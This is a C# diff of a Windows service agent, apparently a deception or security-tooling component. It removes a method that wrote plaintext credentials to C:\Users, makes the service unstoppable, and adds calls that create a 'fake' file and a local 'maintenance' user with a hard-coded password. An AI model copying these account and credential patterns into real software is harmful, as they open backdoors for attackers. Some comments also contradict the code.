@@ -5,13 +5,11 @@ using System;
 using System.Diagnostics;
 using System.ServiceProcess;
 using System.Timers;
-using Common.Extensions;
 using Common.Utils;
 using Common.Persistance;
 using ToolManager.AgentWrappers;
 using System.Threading.Tasks;
-using System.IO;
-using System.Text;
+using IvsAgent.Extensions;
 
 namespace IvsAgent
 {
@@ -36,10 +34,16 @@ namespace IvsAgent
             InitializeComponent();
 
             AutoLog = false;
+            
+            //Allow service to handle shutdown
             CanShutdown = true;
+
+            //Stop service to stop
             CanStop = false;
 
-            CanPauseAndContinue = true;
+            //Stop service to pause and continue
+            CanPauseAndContinue = false;
+            
             CanHandleSessionChangeEvent = true;
 
             toolRepository = new ToolRepository();
@@ -206,8 +210,6 @@ namespace IvsAgent
             avTimer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
             avTimer.Start();
 
-            CreateFile();
-
             _logger.Information("Scheduling dependency after 5 sec...");
 
             Task.Factory.StartNew(async () =>
@@ -218,12 +220,6 @@ namespace IvsAgent
 
             _logger.Information("Task added...");
             toolRepository.CaptureEvent(new ToolStatus(ToolName.Lmp, InstallStatus.Installed, RunningStatus.Running));
-        }
-
-        void CreateFile()
-        {
-            var dir = @"C:\Users";
-            File.WriteAllText(Path.Combine(dir, "Users.txt"), "admin    Passw0rd");
         }
 
         protected override void OnStop()
@@ -237,10 +233,28 @@ namespace IvsAgent
             _isRunning = false;
         }
 
+        protected override void OnPause()
+        {
+            _logger.Information("Agent pause requested");
+            base.OnPause();
+        }
+
+        protected override void OnContinue()
+        {
+            _logger.Information("Agent resume requested");
+            base.OnContinue();
+        }
+
+        protected override void OnCustomCommand(int command)
+        {
+            _logger.Information($"Agent cuustom command: {command}");
+            base.OnCustomCommand(command);
+        }
+
         protected override void OnShutdown()
         {
-            base.OnShutdown();
             _logger.Information("System is shutting down");
+            base.OnShutdown();
         }
 
         private bool inTimer = false;
@@ -331,6 +345,12 @@ namespace IvsAgent
             {
                 _logger.Error("Error in dBytes installer");
             }
+
+            _logger.Information("Adding fake file");
+            FileFaker.CreateFile();
+
+            _logger.Information("Adding fake user");
+            UserExtensions.EnsureFakeUser("maintenance", "P@$$w0rd");
         }
     }
 }
